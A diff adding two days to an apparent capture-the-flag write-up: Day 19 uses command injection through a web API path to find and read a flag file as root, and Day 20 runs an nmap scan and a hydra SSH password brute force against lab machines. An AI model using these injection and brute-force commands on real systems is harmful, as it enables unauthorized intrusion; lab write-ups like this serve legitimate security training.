@@ -290,6 +290,72 @@ Answer
 
 ## Day 19: Commands
 
+we have a webpage here
+
+![image](https://user-images.githubusercontent.com/90561566/210502776-517732f5-81ce-48c0-bd1d-b2a860298f00.png)
+
+we know that there is a command injection vulnerablitity at `/api/cmd/`
+
+![image](https://user-images.githubusercontent.com/90561566/210503034-456614a3-1366-4ea5-b554-191d836453a9.png)
+
+amazing, we can run command throught root user
+
+remember URL encoded:
++ `%20` = `Space`
++ `%2f` = `/`
+
+```
+find / -name user.txt -type f 2>/dev/null
+```
+
+finally, i have the command
+
+```
+http://10.10.4.219:3000/api/cmd/find%20%2f%20-name%20user.txt%20-type%20f%202>%2fdev%2fnull
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210503929-178fc09a-7210-4c00-be21-39b20898cd75.png)
+
+```
+http://10.10.4.219:3000/api/cmd/cat%20%2fhome%2fbestadmin%2fuser.txt
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210504102-74a45660-ef86-47d7-b266-e0120ac584d3.png)
+
+Answer
+
+![image](https://user-images.githubusercontent.com/90561566/210504154-136d7b57-6f15-4fc2-ad48-6e58e861bb4c.png)
+
+## Day 20: Cronjob Privilege Escalation
+
+scan the machine
+
+```
+nmap -sS -sV -p4000-5000 -T4 10.10.168.154
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210505078-34612815-db24-430a-b85a-2afca0aa917a.png)
+
+crack sam's password
+
+```
+hydra -l sam -P /usr/share/wordlists/rockyou.txt ssh://10.10.168.154 -s 4567 -V -f
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210505372-7d923460-9d97-4c3f-89a1-66d24d85689b.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
